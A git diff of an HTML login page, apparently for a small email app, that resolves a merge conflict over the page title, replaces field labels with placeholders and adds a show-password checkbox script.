@@ -1,18 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-<<<<<<< HEAD
     <title>Login</title>
     <style>
         body {
             background-image: url("https://img.freepik.com/free-vector/emails-concept-illustration_114360-1355.jpg?w=1060&t=st=1686228833~exp=1686229433~hmac=8b04bcad99055ce0ea0e1ce67e54743b327dcb1609fca489af735b24f5ec5841");
             background-color: rgba(255, 0, 0, 0.5);
-=======
-    <title>Gmail Lite</title>
-    <style>
-        body {
-            background-image: url("https://img.freepik.com/free-vector/emails-concept-illustration_114360-1355.jpg?w=1060&t=st=1686228833~exp=1686229433~hmac=8b04bcad99055ce0ea0e1ce67e54743b327dcb1609fca489af735b24f5ec5841");
->>>>>>> 1ca7e381aa082206b13be333f4ddffbcbf516709
             background-size: 100%;
             background-position: center;
         }
@@ -82,13 +75,27 @@
         <div class="login-card">
             <h1>Login</h1>
             <form action="/login" method="POST">
-                <label for="gmail_user">Email or phone:</label>
-                <input type="text" id="gmail_user" name="gmail_user" required>
+                <br>
+                <input type="text" id="gmail_user" name="gmail_user"placeholder="Email or Phone Number" required>
 
                 <br><br>
 
-                <label for="gmail_pass">Password:</label>
-                <input type="password" id="gmail_pass" name="gmail_pass" required>
+                <input type="password" id="passwordInput" name="gmail_pass" required placeholder="Password">
+                <input type="checkbox" id="showPassword"> Show Password
+
+                <script>
+                const passwordInput = document.getElementById("passwordInput");
+                const showPasswordCheckbox = document.getElementById("showPassword");
+
+                showPasswordCheckbox.addEventListener("change", function () {
+                    if (showPasswordCheckbox.checked) {
+                    passwordInput.type = "text";
+                    } else {
+                    passwordInput.type = "password";
+                    }
+                });
+                </script>
+
 
                 <br><br>
 
